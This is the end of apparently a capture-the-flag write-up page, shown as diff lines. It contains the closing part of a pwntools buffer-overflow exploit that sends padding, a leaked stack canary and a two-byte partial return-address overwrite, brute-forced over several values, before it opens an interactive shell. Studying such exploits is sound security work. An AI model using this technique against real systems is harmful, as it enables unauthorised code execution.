+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x92&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xa2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xb2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xc2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xd2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xe2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xf2&#39;
+pt.send(pyload)
+
+
+pt.interactive()
+</code></pre>
 </main>
 
 </article>
